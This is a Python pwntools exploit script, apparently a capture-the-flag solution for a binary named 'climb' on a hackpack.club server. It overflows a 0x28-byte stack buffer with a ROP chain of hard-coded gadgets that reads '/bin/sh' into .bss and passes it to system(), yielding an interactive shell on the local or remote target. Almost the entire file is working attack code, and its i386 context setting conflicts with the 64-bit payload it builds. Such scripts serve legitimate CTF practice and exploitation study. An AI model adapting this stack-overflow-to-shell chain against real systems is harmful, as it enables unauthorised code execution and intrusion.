from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./climb"
HOST = "cha.hackpack.club"
PORT = 41702 

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
plt_system = elf.plt["system"]
plt_read = elf.plt["read"]
addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']
#
#libc = ELF('./')
#libc_binsh = next(libc.search("/bin/sh"))
rdi_ret = 0x400743
rsi_r15_ret = 0x400741
rdx_ret = 0x400654
only_ret = 0x4004fe

def exploit():
	bufsize = 0x28
	payload = "A"*bufsize
	payload += p64(only_ret)
	payload += p64(rdi_ret)
	payload += p64(0)
	payload += p64(rsi_r15_ret)
	payload += p64(addr_bss)
	payload += p64(0)
	payload += p64(rdx_ret)
	payload += p64(0x20)
	payload += p64(plt_read)
	payload += p64(rdi_ret)
	payload += p64(addr_bss)
	payload += p64(plt_system)
	conn.sendlineafter("respond?", payload)
	conn.sendline("/bin/sh")
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
